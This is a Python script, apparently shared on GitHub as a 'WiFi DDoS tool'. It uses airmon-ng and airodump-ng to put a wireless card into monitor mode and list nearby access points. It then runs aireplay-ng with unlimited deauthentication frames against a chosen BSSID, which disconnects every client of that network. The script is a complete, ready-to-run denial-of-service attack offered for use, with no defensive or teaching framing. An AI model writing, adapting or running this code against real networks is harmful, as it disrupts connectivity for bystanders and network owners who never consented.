import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime

active_wireless_networks = []

def check_for_essid(essid, lst):
    check_status = True

    if len(lst) == 0:
        return check_status

    for item in lst:
        if essid in item["ESSID"]:
            check_status = False

    return check_status
os.system("clear")
print("\033[92m Thank you for downloading! Please share it! Github page: https://github.com/HACKERGROUPS/WIFIDDOSTOOL")
if not 'SUDO_UID' in os.environ.keys():
    print("\033[91m [-] Try running this program with sudo.")
    exit()

for file_name in os.listdir():
    if ".csv" in file_name:
        print("\033[93m [-] There shouldn't be any .csv files in your directory. We found .csv files in your directory and will move them to the backup directory.")
        directory = os.getcwd()
        try:
            os.mkdir(directory + "/backup/")
        except:
            print("\033[94m [+] Backup folder exists.")
        timestamp = datetime.now()
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

wlan_pattern = re.compile("^wlan[0-9]+")

check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

if len(check_wifi_result) == 0:
    print("\033[91m [-] Please connect a WiFi adapter and try again.")
    exit()

print("\033[92m [*] The following WiFi interfaces are available:")
for index, item in enumerate(check_wifi_result):
    print(f"\033[92m  {index} - {item}")

while True:
    wifi_interface_choice = input("\033[95m [*] Please select the interface you want to use for the attack: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("\033[97m [*] Please enter a number that corresponds with the choices available.")

hacknic = check_wifi_result[int(wifi_interface_choice)]

print("\033[92m [+] WiFi adapter connected!\nNow let's kill conflicting processes:")


kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

print("\033[93m [*] Putting Wifi adapter into monitored mode:")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])

discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

        print("\033[91m [*] Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
        print("\033[93m No |\tBSSID              |\tChannel|\tESSID                         |")
        for index, item in enumerate(active_wireless_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)

except KeyboardInterrupt:
    print("\033[92m\n [+] Ready to make choice.")

while True:
    choice = input("\033[92m [+] Please select a choice from above: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("\033[91m [-] Please try again.")

hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])

subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])

